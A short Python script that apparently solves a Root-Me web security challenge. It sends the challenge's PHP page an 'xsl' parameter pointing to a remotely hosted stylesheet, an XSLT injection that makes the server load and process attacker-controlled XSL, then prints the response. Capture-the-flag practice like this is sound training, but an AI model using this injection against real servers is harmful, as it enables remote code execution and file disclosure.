#!/bin/python3 env
import requests

url="http://challenge01.root-me.org/web-serveur/ch50/index.php"
session = requests.session()
#with open('style6.xsl','rb') as file:
#	stuff=file.read()

stuff='http://proximacentauri88.epizy.com/style1.xsl'
data={'xsl':stuff}
res = session.post(url, data=data)

print res.headers
print res.text